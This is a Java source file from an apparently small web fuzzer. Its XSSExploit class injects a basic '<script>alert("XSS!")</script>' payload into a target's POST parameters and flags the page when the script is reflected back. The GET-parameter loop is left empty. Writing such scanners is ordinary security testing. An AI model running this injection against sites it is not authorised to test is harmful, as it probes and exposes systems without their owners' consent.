package com.fuzzer.exploits;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

import com.fuzzer.links.URLTarget;
import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.HttpMethod;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.WebRequest;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.util.NameValuePair;

public class XSSExploit {

	private static String BASIC_SCRIPT = "<script>alert(\"XSS!\")</script>";

	public static void exploitBasicXSS(WebClient wc, URLTarget target) {
		String targetPage = target.page;
		
		if (!target.getArgs.isEmpty()) {
			targetPage += "?";	
		}
		
        Map<String,Object> map = new HashMap<String,Object>();
		for (String param : target.getArgs) {
			
		}
		targetPage += MapQuery.urlEncodeUTF8(map);

		WebRequest request;
		try {
			request = new WebRequest(new URL(targetPage),
					target.postArgs.isEmpty() ? HttpMethod.GET : HttpMethod.POST);
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return;
		}

		// Then we set the request parameters
		request.setRequestParameters(new ArrayList<NameValuePair>());
		for (String param : target.postArgs) {
			request.getRequestParameters().add(
					new NameValuePair(param, BASIC_SCRIPT));			
		}


		// Finally, we can get the page
		HtmlPage page;
		try {
			page = wc.getPage(request);
		} catch (FailingHttpStatusCodeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return;
		}
		
		if (page.getWebResponse().getContentAsString().contains(BASIC_SCRIPT)) {
			System.out.println("XSS Found: " + target.page);
		}
	}
}


class MapQuery {
    static String urlEncodeUTF8(String s) {
        try {
            return URLEncoder.encode(s, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            throw new UnsupportedOperationException(e);
        }
    }
    static String urlEncodeUTF8(Map<?,?> map) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<?,?> entry : map.entrySet()) {
            if (sb.length() > 0) {
                sb.append("&");
            }
            sb.append(String.format("%s=%s",
                urlEncodeUTF8(entry.getKey().toString()),
                urlEncodeUTF8(entry.getValue().toString())
            ));
        }
        return sb.toString();       
    }
}